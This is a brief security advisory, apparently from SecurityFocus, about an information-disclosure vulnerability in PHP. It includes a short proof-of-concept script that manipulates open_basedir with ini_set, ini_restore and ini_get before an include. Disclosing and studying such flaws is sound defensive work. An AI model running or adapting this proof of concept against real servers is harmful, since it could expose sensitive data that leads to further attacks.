source: http://www.securityfocus.com/bid/36009/info
 
PHP is prone to an information-disclosure vulnerability.
 
Attackers can exploit this issue to obtain sensitive information that may lead to further attacks. 

<?php
ini_set("open_basedir", "A");
ini_restore("open_basedir");
ini_get("open_basedir");


include("B");

?>